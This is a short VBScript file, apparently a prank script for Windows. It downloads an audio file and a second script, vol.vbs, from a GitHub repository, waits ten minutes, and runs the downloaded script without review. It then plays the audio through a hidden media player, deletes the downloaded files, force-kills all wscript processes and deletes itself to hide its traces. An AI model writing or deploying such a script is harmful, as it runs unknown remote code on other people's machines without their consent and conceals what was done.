set WshShell = CreateObject("WScript.Shell")
Set objWinHttp = CreateObject("WinHttp.WinHttpRequest.5.1")
Dim oPlayer
Set oPlayer = CreateObject("WMPlayer.OCX")
Set obj = CreateObject("Scripting.FileSystemObject")
Set Keys = CreateObject("WScript.Shell")
Set vb = CreateObject("WScript.Shell")

strScript = Wscript.ScriptFullName
'dl s
URL = "https://github.com/greisenmeisen/legendary-invention/raw/main/1.mp3"
objWinHttp.open "GET", URL, False
objWinHttp.send ""
SaveBinaryData "1.mp3",objWinHttp.responseBody
WScript.Sleep 500
'dl vol sc
URL = "https://raw.githubusercontent.com/greisenmeisen/legendary-invention/main/vol.vbs"
objWinHttp.open "GET", URL, False
objWinHttp.send ""
SaveBinaryData "vol.vbs",objWinHttp.responseBody

WScript.Sleep 600000
CreateObject("WScript.Shell").Run "vol.vbs"

'au p
oPlayer.URL = "1.mp3"
oPlayer.controls.play 
While oPlayer.playState <> 1 ' 1 = Stopped
  WScript.Sleep 100
Wend
oPlayer.close

'end
obj.DeleteFile("1.mp3")
obj.DeleteFile("vol.vbs")
WScript.Sleep 500
CreateObject("WScript.Shell").Run "taskkill /im wscript.exe /f"
Set oFso = CreateObject("Scripting.FileSystemObject") : oFso.DeleteFile Wscript.ScriptFullName, True


Function SaveBinaryData(FileName, Data)

' adTypeText for binary = 1
Const adTypeText = 1
Const adSaveCreateOverWrite = 2

' Create Stream object
Dim BinaryStream
Set BinaryStream = CreateObject("ADODB.Stream")

' Specify stream type - we want To save Data/string data.
BinaryStream.Type = adTypeText

' Open the stream And write binary data To the object
BinaryStream.Open
BinaryStream.Write Data

' Save binary data To disk
BinaryStream.SaveToFile FileName, adSaveCreateOverWrite

End Function